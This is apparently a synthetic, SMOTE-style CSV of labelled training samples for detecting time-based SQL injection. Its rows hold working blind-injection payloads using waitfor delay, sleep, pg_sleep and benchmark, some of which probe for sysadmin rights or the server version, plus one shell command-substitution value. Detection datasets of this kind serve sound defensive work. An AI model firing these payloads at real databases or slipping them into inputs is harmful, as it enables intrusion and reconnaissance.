id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.1226121685143848
SMOTE_000002,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.70641434491687
SMOTE_000003,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.5437520329188208
SMOTE_000004,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.05250860718320148
SMOTE_000005,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.5323085747182404
SMOTE_000006,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.3389461918468923
SMOTE_000007,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6435067471206848
SMOTE_000008,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.399004026707955
SMOTE_000009,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.6766512853796507
SMOTE_000010,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.5906922773387042
SMOTE_000011,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6135556815773472
SMOTE_000012,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.09162360466693191
SMOTE_000013,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.47133225935514694
SMOTE_000014,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.38254983907451795
SMOTE_000015,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.5370698433086286
SMOTE_000016,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.04501376295953046
SMOTE_000017,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.004922550165759568
SMOTE_000018,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.541359621552114
SMOTE_000019,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.07423988176050832
SMOTE_000020,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.7631871877032463
SMOTE_000021,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.7335777062543343
SMOTE_000022,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.3093387684993014
SMOTE_000023,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.48292981457889744
SMOTE_000024,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.0203357055343196
SMOTE_000025,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.29233224846482875
SMOTE_000026,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.2336723563779175
SMOTE_000027,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.2690092365177215
SMOTE_000028,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,2.389518431711132
SMOTE_000029,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.958535444617371
SMOTE_000030,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.29661956339827367
SMOTE_000031,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7561598626619679
SMOTE_000032,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.1626489671538387
SMOTE_000033,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.11118048267991233
SMOTE_000034,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.8850295766978524
